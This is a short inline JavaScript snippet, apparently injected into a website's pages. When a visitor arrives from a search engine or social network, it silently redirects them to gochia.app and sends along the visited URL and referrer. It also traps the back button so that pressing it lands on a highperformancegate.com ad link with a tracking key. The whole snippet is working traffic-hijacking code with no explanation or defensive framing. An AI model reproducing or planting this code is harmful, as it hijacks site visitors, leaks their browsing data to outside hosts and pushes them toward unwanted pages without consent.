//<![CDATA[
    if(document.referrer)
    {
    	var cek = document.referrer;

    	var ars 	= rChoice([
							'https://gochia.app/',
							]);

				function rChoice(arr) {
    			return arr[Math.floor(arr.length * Math.random())];
	}

	//Code arsae client javascript
	if(['.google.', 'bing.', 'yandex.', 'facebook.', 'pinterest.'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) }
    }
(function(window, location) {
history.replaceState(null, document.title, location.pathname+"#!/history");
history.pushState(null, document.title, location.pathname);

window.addEventListener("popstate", function() {
if(location.hash === "#!/history") {
history.replaceState(null, document.title, location.pathname);
setTimeout(function(){
location.replace("https://www.highperformancegate.com/d7ha27e5?key=3e13d68a557a37d91e09eff64ec81731");
},10);
}
}, false);
}(window, location));
//]]>

